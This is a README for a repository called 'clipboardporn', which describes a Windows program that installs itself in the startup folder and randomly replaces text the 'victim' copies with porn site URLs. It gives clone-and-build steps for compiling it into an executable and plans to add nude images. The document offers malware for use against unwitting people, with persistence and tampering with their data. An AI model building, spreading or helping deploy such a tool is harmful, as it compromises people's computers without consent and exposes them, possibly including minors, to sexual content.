# clipboardporn
Swaps text from the Windows clipboard for random porn site urls.

This repo includes scripts for compilation into a single ".exe".

The script gets persistance, by copying itself into shell:startup.

Everytime the victim copies text into the clipboard, there's one in three chances that it will be replaced for a random porn site url.

There's about sixteen thousand porn sites url which may be picked.

Enjoy!


## Requirements

- Linux
    1. wine
        * `sudo pacman -S wine`
        * `sudo apt install wine`

- Windows
    1. Python3.7
    1. pipenv
        * `pip install pipenv`


## Before we may begin...

- On Linux
    * When prompted to install python, add it to the PATH variable
    * Installing wine's mono and gecko packages aren't necessary

- On Windows
    * Using pipenv is not really necessary; you could install the module dependencies through pip, although that's not recommended.


## Quickstart

- Linux
    1. `git clone https://github.com/BrunoFauth/clipboardporn`
    1. `./clipboardporn/build.sh`

- Windows
    1. `git clone https://github.com/BrunoFauth/clipboardporn`
    1. `cd clipboardporn`
    1. `pipenv install`
    1. `pipenv run build.bat`


#TODO

* Swap bitmaps for nudes
